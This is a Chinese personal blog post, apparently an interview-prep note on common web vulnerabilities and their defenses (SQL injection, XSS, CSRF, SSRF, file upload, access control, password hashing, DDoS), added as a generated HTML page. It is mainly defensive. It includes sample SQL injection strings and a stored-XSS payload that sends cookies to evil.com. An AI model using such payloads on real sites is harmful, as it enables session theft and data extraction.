@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"pclhahaha.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.28.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"onmobile":false},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":false},"fold":{"enable":false,"height":500},"language":false,"highlight_theme":"normal"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="1.1 SQL 注入攻击原理：拼接用户输入构造 SQL，攻击者注入恶意片段。 1234String sql &#x3D; &quot;SELECT * FROM users WHERE username &#x3D; &#x27;&quot; + username + &quot;&#x27;&quot;;&#x2F;&#x2F; 输入: &#x27; OR &#x27;1&#x27;&#x3D;&#x27;1&#x27; --&#x2F;&#x2F; → SELE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见 Web 漏洞攻防">
+<meta property="og:url" content="http://pclhahaha.github.io/web-vulnerabilities/index.html">
+<meta property="og:site_name" content="个人笔记">
+<meta property="og:description" content="1.1 SQL 注入攻击原理：拼接用户输入构造 SQL，攻击者注入恶意片段。 1234String sql &#x3D; &quot;SELECT * FROM users WHERE username &#x3D; &#x27;&quot; + username + &quot;&#x27;&quot;;&#x2F;&#x2F; 输入: &#x27; OR &#x27;1&#x27;&#x3D;&#x27;1&#x27; --&#x2F;&#x2F; → SELE">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-04T16:00:00.000Z">
+<meta property="article:author" content="pcl">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://pclhahaha.github.io/web-vulnerabilities/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://pclhahaha.github.io/web-vulnerabilities/","path":"web-vulnerabilities/","title":"常见 Web 漏洞攻防"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>常见 Web 漏洞攻防 | 个人笔记</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","mhchem":false,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">个人笔记</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-ai"><a href="/ai/" rel="section"><i class="fa fa-robot fa-fw"></i>AI</a></li><li class="menu-item menu-item-data"><a href="/data/" rel="section"><i class="fa fa-database fa-fw"></i>Data</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">1.1 SQL 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">1.2 XSS（跨站脚本攻击）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">1.3 CSRF（跨站请求伪造）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-SSRF%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">1.4 SSRF（服务端请求伪造）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">1.5 文件上传漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.</span> <span class="nav-text">1.6 越权漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8"><span class="nav-number">7.</span> <span class="nav-text">1.7 密码安全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-8-DDoS-%E9%98%B2%E5%BE%A1"><span class="nav-number">8.</span> <span class="nav-text">1.8 DDoS 防御</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="pcl"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">pcl</p>
+  <div class="site-description" itemprop="description">个人技术笔记 - Java、系统编程、Web基础架构</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">155</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">394</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://pclhahaha.github.io/web-vulnerabilities/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="pcl">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人笔记">
+      <meta itemprop="description" content="个人技术笔记 - Java、系统编程、Web基础架构">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="常见 Web 漏洞攻防 | 个人笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          常见 Web 漏洞攻防
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-07-05 00:00:00" itemprop="dateCreated datePublished" datetime="2026-07-05T00:00:00+08:00">2026-07-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="1-1-SQL-注入"><a href="#1-1-SQL-注入" class="headerlink" title="1.1 SQL 注入"></a>1.1 SQL 注入</h3><p><strong>攻击原理</strong>：拼接用户输入构造 SQL，攻击者注入恶意片段。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">// 输入: &#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --</span></span><br><span class="line"><span class="comment">// → SELECT * FROM users WHERE username = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --&#x27;</span></span><br><span class="line"><span class="comment">// 输入: &#x27; UNION SELECT id, password FROM admin_users --</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>防御——预编译（Prepared Statement）</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>);</span><br><span class="line">ps.setString(<span class="number">1</span>, username);  <span class="comment">// 参数绑定：值只当数据不当 SQL 语法</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>预编译为什么能防？</strong> SQL 模板先送数据库解析编译生成执行计划，参数值后送——结构与数据解耦，参数值不会被重新解析为 SQL 语法。</p>
+<p><strong>MyBatis <code>#</code> vs <code>$</code></strong>：<code>#&#123;&#125;</code> 是预编译，JDBC 层走 <code>PreparedStatement.setString()</code>，值永远不当 SQL 执行；<code>$&#123;&#125;</code> 是字符串替换，JDBC 层走 <code>Statement.execute(sqlString)</code>，SQL 由应用拼接后整条发送——数据库分不出哪部分是原始 SQL 哪部分是用户输入的。动态表名&#x2F;排序必须用 <code>$&#123;&#125;</code> 时，必须做白名单校验——<code>if (!ALLOWED_COLUMNS.contains(orderColumn)) throw</code>。</p>
+<p><strong>面试追问——ORM 框架能彻底防 SQL 注入吗？</strong> 不能。即使 Hibernate&#x2F;MyBatis 默认启用了预编译，一旦用了原生 SQL（如 <code>entityManager.createNativeQuery()</code>）或 <code>$&#123;&#125;</code>，注入仍然存在。另外，存储过程中使用 <code>EXEC</code> 拼接参数也会引入注入风险。</p>
+<h3 id="1-2-XSS（跨站脚本攻击）"><a href="#1-2-XSS（跨站脚本攻击）" class="headerlink" title="1.2 XSS（跨站脚本攻击）"></a>1.2 XSS（跨站脚本攻击）</h3><p>攻击者将恶意脚本注入网页，在受害者浏览器中执行。</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>攻击向量</th>
+<th>触发方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反射型</td>
+<td>URL 参数回显</td>
+<td>点击恶意链接</td>
+</tr>
+<tr>
+<td>存储型</td>
+<td>脚本存数据库</td>
+<td>访问正常页面（评论区→所有访问者中招）</td>
+</tr>
+<tr>
+<td>DOM 型</td>
+<td>前端 JS 操纵 DOM</td>
+<td>点击恶意链接</td>
+</tr>
+</tbody></table>
+<p>存储型示例：攻击者在评论区提交 <code>&lt;script&gt;new Image().src=&#39;http://evil.com/steal?c=&#39;+document.cookie&lt;/script&gt;</code> → 所有访问评论页的用户 Cookie 被窃。</p>
+<p><strong>防御</strong>：</p>
+<ol>
+<li><strong>输出编码</strong>（最核心）：<code>&lt;</code> → <code>&amp;lt;</code>（HTML Entity）、<code>&quot;</code> → <code>&amp;quot;</code>。不同上下文不同规则：HTML 内容用 HTML Entity 编码；HTML 属性用属性编码（<code>&quot;</code> → <code>&amp;#x22;</code>）；JavaScript 上下文用 <code>\xHH</code> Unicode 编码；URL 参数用 <code>encodeURIComponent()</code>。React&#x2F;Vue 默认 <code>&#123;data&#125;</code> 自动转义，<code>v-html</code>&#x2F;<code>dangerouslySetInnerHTML</code> 需极度谨慎——只有在你完全信任的数据源或经过严格净化（DOMPurify）后才使用。</li>
+<li><strong>CSP（Content Security Policy）</strong>：<code>script-src &#39;self&#39;</code> 只执行同源脚本，即使注入 <code>&lt;script&gt;</code> 浏览器也不执行——XSS 的最后防线。注意：用 <code>&#39;nonce-xxx&#39;</code> 可以按需开放特定内联脚本；<code>&#39;unsafe-inline&#39;</code> 会完全禁用 CSP 的 XSS 防护，绝对避免。</li>
+<li><strong>HttpOnly Cookie</strong>：Cookie 对 <code>document.cookie</code> 不可见，即使 XSS 成功也无法窃取会话。</li>
+<li><strong>输入校验</strong>：格式约束和长度限制。不能替代输出编码——合法输入在另一上下文可能变成恶意输出。</li>
+</ol>
+<h3 id="1-3-CSRF（跨站请求伪造）"><a href="#1-3-CSRF（跨站请求伪造）" class="headerlink" title="1.3 CSRF（跨站请求伪造）"></a>1.3 CSRF（跨站请求伪造）</h3><p><strong>原理</strong>：用户登录 bank.com（Cookie 有效），访问 evil.com。evil.com 隐藏表单向 bank.com&#x2F;transfer 发 POST，浏览器自动携带 bank.com Cookie，服务端认为用户本人操作。</p>
+<p><strong>三种防御</strong>：</p>
+<ol>
+<li><strong>CSRF Token</strong>（最经典）：服务端生成随机 Token 埋入页面隐藏域，提交时校验。攻击者跨站无法读取目标页面 DOM（同源策略），无法获取 Token。每个会话独立生成防止固定 token 攻击。</li>
+<li><strong>SameSite Cookie</strong>（最省力的现代方案）：</li>
+</ol>
+<ul>
+<li><code>SameSite=Strict</code>：任何跨站请求（GET&#x2F;POST 等）都不带 Cookie。CSRF 被完全防住，但从邮件点链接打开网站也不带 Cookie，用户体验差。</li>
+<li><code>SameSite=Lax</code>（Chrome 默认值）：跨站 POST&#x2F;PUT&#x2F;DELETE 不带 Cookie；跨站顶级导航 GET（<code>&lt;a href&gt;</code>、<code>&lt;link rel=&quot;prerender&quot;&gt;</code>）可带。能防御所有写操作 CSRF，不影响正常跳转体验。是不依赖 CSRF Token 的最推荐现代方案。</li>
+<li><code>SameSite=None</code>：必须配合 <code>Secure</code> 属性（仅 HTTPS 生效），用于跨站 iframe 嵌入等场景。</li>
+</ul>
+<p><strong>CSRF Token 与 SameSite 的关系</strong>：两者互补而非替代。SameSite 是浏览器层面的第一道防线（有浏览器兼容性窗口），CSRF Token 是服务端层面的保险。关键业务操作建议两者都开启。<br>3. <strong>Origin&#x2F;Referer 校验</strong>：检查请求来源是否为本站。某些环境会移除 Referer，不可作为唯一防御。</p>
+<p><strong>SPA 场景</strong>：JWT 放 <code>Authorization</code> header 而非 Cookie，跨站请求无法给 header 赋值，CSRF 天然不存在。</p>
+<h3 id="1-4-SSRF（服务端请求伪造）"><a href="#1-4-SSRF（服务端请求伪造）" class="headerlink" title="1.4 SSRF（服务端请求伪造）"></a>1.4 SSRF（服务端请求伪造）</h3><p>攻击者控制服务端发起的请求目标，以服务端为跳板访问内网——读云元数据（AWS <code>169.254.169.254/latest/meta-data/</code> 拿临时凭证）、攻击内网 Redis&#x2F;数据库、端口扫描。</p>
+<p><strong>防御</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidUrl</span><span class="params">(String urlStr)</span> &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(urlStr);</span><br><span class="line">    <span class="comment">// 1. 协议白名单：只允许 http/https，拒绝 file://、gopher://、dict://</span></span><br><span class="line">    <span class="keyword">if</span> (!Set.of(<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>).contains(url.getProtocol())) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 2. DNS 解析后过滤内网 IP（127/10/172.16/192.168 段）</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> InetAddress.getByName(url.getHost());</span><br><span class="line">    <span class="keyword">if</span> (addr.isLoopbackAddress() || addr.isSiteLocalAddress() || addr.isLinkLocalAddress())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>要点</strong>：协议白名单非黑名单；先 DNS 后 IP 校验（防 <code>http://safe@10.0.0.1</code> 绕过）；禁止 302 跳转内网或对跳转目标也做校验；防 DNS Rebinding（连接时再次校验 IP、使用固定 DNS resolver 缓存 TTL）。</p>
+<h3 id="1-5-文件上传漏洞"><a href="#1-5-文件上传漏洞" class="headerlink" title="1.5 文件上传漏洞"></a>1.5 文件上传漏洞</h3><p>攻击面：上传 WebShell（如 JSP&#x2F;PHP），通过 URL 访问执行命令。</p>
+<p><strong>多层防御</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FileUploadResult <span class="title function_">upload</span><span class="params">(MultipartFile file)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 扩展名白名单（jpg/png/pdf）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ext</span> <span class="operator">=</span> FilenameUtils.getExtension(file.getOriginalFilename()).toLowerCase();</span><br><span class="line">    <span class="keyword">if</span> (!ALLOWED_EXT.contains(ext)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadRequestException</span>(<span class="string">&quot;类型不允许&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Magic Number 校验（防改名 .jpg 绕过）</span></span><br><span class="line">    <span class="comment">// JPEG: FF D8 FF E0  PNG: 89 50 4E 47  GIF: 47 49 46 38</span></span><br><span class="line">    <span class="keyword">if</span> (!detectByMagicNumber(file).equals(ext)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadRequestException</span>(<span class="string">&quot;伪装文件&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 大小限制（10MB）+ 随机文件名防路径遍历</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> UUID.randomUUID() + <span class="string">&quot;.&quot;</span> + ext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 存在 Web 根目录外（/data/uploads/），攻击者无法通过 URL 直接访问</span></span><br><span class="line">    file.transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/data/uploads/&quot;</span> + name));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 图片重编码去除嵌入恶意代码</span></span><br><span class="line">    <span class="keyword">if</span> (isImage(ext)) ImageIO.write(ImageIO.read(file.getInputStream()), ext, <span class="keyword">new</span> <span class="title class_">File</span>(path));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>补充要点</strong>：上传目录移除执行权限；防压缩炸弹（限制解压后大小和层级深度）。</p>
+<h3 id="1-6-越权漏洞"><a href="#1-6-越权漏洞" class="headerlink" title="1.6 越权漏洞"></a>1.6 越权漏洞</h3><p>业务安全最常见的漏洞——权限框架配对了，代码漏了数据范围校验。</p>
+<p><strong>水平越权</strong>（同级访问他人数据）：<code>GET /api/orders/1002</code> 返回了别人的订单。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误：直接用 URL 中的 ID 查，查出任何人的数据</span></span><br><span class="line"><span class="keyword">public</span> Order <span class="title function_">getOrder</span><span class="params">(Long orderId)</span> &#123; <span class="keyword">return</span> orderService.getById(orderId); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确：强制以当前用户为过滤条件</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/orders&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Order&gt; <span class="title function_">getMyOrders</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> orderService.getByUserId(SecurityUtils.getCurrentUserId());</span><br><span class="line">    <span class="comment">// URL 中不暴露可修改的 userId——根本上杜绝</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>垂直越权</strong>（低权限执行高权限操作）：普通用户直接调 <code>POST /api/admin/users/delete</code>。防御：<code>@PreAuthorize(&quot;hasRole(&#39;ADMIN&#39;)&quot;)</code>。</p>
+<p><strong>核心原则</strong>：操作主体 ID 只能从 <code>SecurityContextHolder</code> 获取，永远不信任前端传来的用户 ID。前端传 ID 只是告诉你操作哪个资源，是否有权操作必须由当前登录身份判断。</p>
+<h3 id="1-7-密码安全"><a href="#1-7-密码安全" class="headerlink" title="1.7 密码安全"></a>1.7 密码安全</h3><p><strong>彩虹表攻击</strong>：预计算大量”密码→哈希”映射表，泄露哈希后直接查表还原密码。</p>
+<p><strong>加盐防彩虹表</strong>：每用户随机 salt，<code>hash(&quot;pass&quot; + &quot;salt1&quot;) ≠ hash(&quot;pass&quot; + &quot;salt2&quot;)</code>。攻击者须为每个 salt 重新计算，成本从 O(1) 变为 O(N)。</p>
+<p><strong>Bcrypt</strong>——专为密码设计：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">hash</span> <span class="operator">=</span> BCrypt.hashpw(password, BCrypt.gensalt(<span class="number">12</span>));  <span class="comment">// cost=2^12=4096次迭代</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> BCrypt.checkpw(inputPassword, hash);  <span class="comment">// 自动提取 salt 重新计算</span></span><br></pre></td></tr></table></figure>
+
+<p>关键设计：cost factor 随时间提升保持抗暴力破解成本；盐内置在结果中不单独存储；内存访问模式对 GPU&#x2F;ASIC 不友好（对抗硬件加速暴力破解）。</p>
+<p><strong>Argon2 系列</strong>：Argon2id 混合模式是 2015 年密码哈希竞赛冠军，当前最推荐。核心思想——密码哈希要”<strong>慢</strong>“（0.1-0.5s&#x2F;次），让用户体验无影响但暴力破解成本指数上升。<strong>绝不</strong>用 MD5&#x2F;SHA256 存密码——它们为数据完整性设计，计算太快（每秒数十亿次）。</p>
+<h3 id="1-8-DDoS-防御"><a href="#1-8-DDoS-防御" class="headerlink" title="1.8 DDoS 防御"></a>1.8 DDoS 防御</h3><p>DDoS 通过海量请求占满带宽或服务器资源使服务不可用。纵深防御体系：</p>
+<p><strong>SYN Cookie</strong>（传输层）：TCP SYN Flood 攻击者大量发送 SYN 不完成握手，占满服务器 TCB 内存。SYN Cookie 在收到 SYN 时不分配内存，而是根据 IP&#x2F;端口&#x2F;时间戳&#x2F;密钥算出 Cookie 作为 SYN+ACK 的序列号；收到 ACK 时验证确认号 &#x3D; Cookie+1 才分配资源——把”状态保持”外包给网络，攻击者半连接零成本。</p>
+<p><strong>应用层限流</strong>（应用层）：Guava RateLimiter 每 IP 令牌桶限流；Nginx <code>limit_conn_zone</code> 限制同一 IP 并发连接数；WAF&#x2F;验证码识别恶意流量。</p>
+<p><strong>CDN 分散</strong>：DNS 将流量分散到上百个边缘节点，攻击流量被稀释吸收；清洗后的正常流量才到源站。</p>
+<p><strong>DDoS 分类与针对性防御</strong>：</p>
+<p>DDoS 按攻击层次分为三类，不同层次防御手段不同：</p>
+<ul>
+<li><strong>网络层攻击（L3&#x2F;L4）</strong>：SYN Flood、UDP Flood、ICMP Flood——用大量数据包占满带宽或连接表。防御靠运营商黑洞清洗&#x2F;高防 IP&#x2F;Anycast 分散流量。</li>
+<li><strong>协议层攻击（L4）</strong>：SYN Flood、ACK Flood——利用协议握手缺陷消耗服务器资源。防御靠 SYN Cookie&#x2F;SYN Proxy。</li>
+<li><strong>应用层攻击（L7）</strong>：HTTP Flood、Slowloris——模拟正常用户行为，少量请求就能打挂应用。最难防御，因为攻击请求与正常请求难以区分。防御靠 WAF（请求特征分析）、验证码（人机识别）、限流 + 熔断。</li>
+</ul>
+<p>Slowloris 原理特别值得了解：攻击者建立大量连接，每连接每隔 10 秒才发一个 HTTP 头部字节，用极慢的速度永远不完成请求。服务器上大量连接处于”等待请求体”状态，连接池耗尽。防御：Nginx <code>client_header_timeout 10s</code>、<code>limit_conn</code> 限制单 IP 连接数。</p>
+<hr>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/CSRF/" rel="tag"># CSRF</a>
+              <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/java-mybatis/" rel="prev" title="MyBatis 源码解析">
+                  <i class="fa fa-angle-left"></i> MyBatis 源码解析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/url-shortener-design/" rel="next" title="短链系统设计">
+                  短链系统设计 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
